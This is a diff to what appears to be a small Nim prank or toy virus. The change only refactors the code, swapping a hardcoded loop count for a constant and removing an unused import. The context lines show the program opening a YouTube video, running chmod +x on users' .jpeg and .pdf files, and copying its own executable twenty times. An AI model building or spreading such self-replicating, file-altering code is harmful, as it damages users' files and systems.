@@ -1,7 +1,6 @@
 import std/os
 import std/browsers
 import osproc
-import std/strformat
 
 proc Rasputin() =
     let url = "https://www.youtube.com/watch?v=16y1AkoZkmQ"
@@ -22,14 +21,13 @@ proc targetExtensions(filename: string, directory: string, extensions: seq[strin
                 var command = "chmod +x " & file.path
                 discard execProcess(command, options={ProcessOption.poEvalCommand})
             
-    
-
 
 proc main() =
 
     let filename = getAppFilename()
     let directory = getAppDir()
     var extensionsToTarget: seq[string] = @[".jpeg", ".pdf"]
+    const MAX_ITERATIONS = 20
 
 
     # create a directory for generated files
@@ -37,7 +35,7 @@ proc main() =
 
     discard existsOrCreateDir(generatedDir)
 
-    for i in 1..20:
+    for i in 1..MAX_ITERATIONS:
         var newfile = filename & $i
         copyFile(filename, newfile)
         copyFileToDir(newfile, generatedDir)
